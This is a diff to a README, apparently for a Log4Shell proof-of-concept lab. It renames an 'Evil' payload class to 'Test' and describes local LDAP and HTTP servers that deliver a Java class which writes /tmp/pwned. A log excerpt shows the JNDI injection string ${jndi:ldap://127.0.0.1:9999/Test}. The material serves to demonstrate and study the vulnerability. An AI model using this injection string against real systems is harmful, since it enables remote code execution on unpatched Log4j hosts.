@@ -37,9 +37,9 @@ The server module runs a lean LDAP & HTTP server.
 The LDAP server listens on port `9999` by default and will return an `LDAPResult` that includes a URL reference to a
 Java class that will be deserialized and executed.
 
-The HTTP server listens on port `8000` and responds to any request with a byte array that is the `Evil.class`.
+The HTTP server listens on port `8000` and responds to any request with a byte array that is the `Test.class`.
 
-`Evil` implements `ObjecFactory` which the JNDI mechanism hooks into to execute its `getObjectInstance` method. While
+`Test` implements `ObjecFactory` which the JNDI mechanism hooks into to execute its `getObjectInstance` method. While
 the method simply returns `null`, it uses `Runtime` to execute arbitrary code on the host machine. In this case, it
 writes to a file called: `/tmp/pwned` to prove that it _could_ execute basically anything available on the machine.
 
@@ -88,7 +88,7 @@ java.vm.info=mixed mode
 ---------------------------------
 20:27:49.676 [Main.main()] ERROR Main - test
 /tmp/pwned DOES NOT EXIST
-20:27:49.679 [Main.main()] ERROR Main - Output:${jndi:ldap://127.0.0.1:9999/Evil}
+20:27:49.679 [Main.main()] ERROR Main - Output:${jndi:ldap://127.0.0.1:9999/Test}
 /tmp/pwned EXISTS - yah been pwned!
 ```
 
